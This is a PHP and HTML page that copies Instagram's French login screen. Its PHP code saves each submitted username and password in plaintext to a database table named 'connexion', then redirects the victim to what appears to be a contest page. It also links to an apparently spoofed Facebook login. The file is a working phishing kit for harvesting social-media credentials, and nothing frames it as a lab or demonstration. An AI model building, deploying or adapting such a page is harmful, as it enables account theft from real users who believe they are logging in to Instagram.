<?php
// Connexion à la base de données
$host = "localhost";
$dbname = "Instagram";
$username = "root";
$password = "root";

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password); 
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Erreur de connexion : " . $e->getMessage());
}

// Vérification si le formulaire est soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $error = "";

    if (empty($_POST["username"]) || empty($_POST["password"])) {
        $error = "Veuillez remplir tous les champs.";
    } else {
        $username = $_POST["username"];
        $password = $_POST["password"]; // Sécurisé à améliorer

        // Insérer les informations dans la base de données
        $stmt = $pdo->prepare("INSERT INTO connexion (username, password) VALUES (:username, :password)");
        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":password", $password);
        $stmt->execute();

        header("Location: Page-concours.php");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }

        .login-container {
            background-color: #121212;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            width: 320px;
        }

        .login-container h1 {
            color: white;
            font-family: 'Pacifico', cursive;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #333;
            background-color: #222;
            color: white;
        }

        .login-button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-button:hover {
            background-color: #0077cc;
        }

        .separator {
            color: gray;
            margin: 10px 0;
        }

        .facebook-login {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link {
            color: white;
        }

        .download-apps img {
            width: 120px;
            margin: 10px;
        }

        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form method="post">
            <input type="text" name="username" placeholder="Num. téléphone, nom de profil ou e-mail">
            <input type="password" name="password" placeholder="Mot de passe">
            <br><br>
            <button type="submit" class="login-button">Se connecter</button>
        </form>

        <?php if (isset($error) && !empty($error)) echo "<p class='error-message'>$error</p>"; ?>

        <br>
        <p class="separator">OU</p>
        <a href="Facebook-login.php" class="facebook-login">Se connecter avec Facebook</a>
        <p><a href="#" style="color:gray;">Mot de passe oublié ?</a></p>
        <p class="signup-link">Vous n'avez pas de compte ? <a href="#" style="color:#0095f6;">Inscrivez-vous</a></p>

        <div class="download-apps">
            <a href="https://play.google.com/store/search?q=instagram&c=apps&hl=fr"><img src="img/google-play-badge.png" alt="Google Play"></a>
            <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?cid=msft_web_appsforwindows_chart&hl=fr-FR&gl=WF"><img src="img/microsoft.png" alt="Microsoft Store"></a>
        </div>
    </div>
</body>

</html>
